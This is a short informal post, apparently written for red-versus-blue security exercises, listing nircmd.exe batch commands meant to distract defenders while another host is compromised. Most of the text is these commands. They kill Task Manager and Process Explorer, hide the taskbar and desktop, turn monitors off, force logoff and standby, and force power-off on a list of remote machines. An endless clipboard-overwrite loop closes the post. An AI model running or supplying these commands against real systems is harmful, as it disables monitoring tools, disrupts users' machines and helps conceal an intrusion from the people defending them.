One of the best ways to throw blue teamers off the scent of another host getting owned, which also has the added effect of stressing them out is a batch script that runs through some of the more annoying features in nircmd.exe in succession and at regular intervals:

* setdisplay 640x480
* killprocess taskmgr.exe
* killprocess procexp.exe
* win -style title "my computer" 0x00c00000
* win child title "my computer" +exstyle all 0x00400000
* win +exstyle title "my computer" 0x00400000
* win trans ititle "internet explorer" 256
* win close class "CabinetWClass"
* multiremote copy "c:tempcomputers.txt" exitwin poweroff force
* exitwin logoff
* standby
* monitor off
* win child class "Shell_TrayWnd" hide class "button"
* win hide class progman

Just to name a few...

another fun batch script to have running is 'echo knock knock | clip' in an endless and delayless loop. (I makes 'knock knock' the only thing that will ever be pasted ;-)
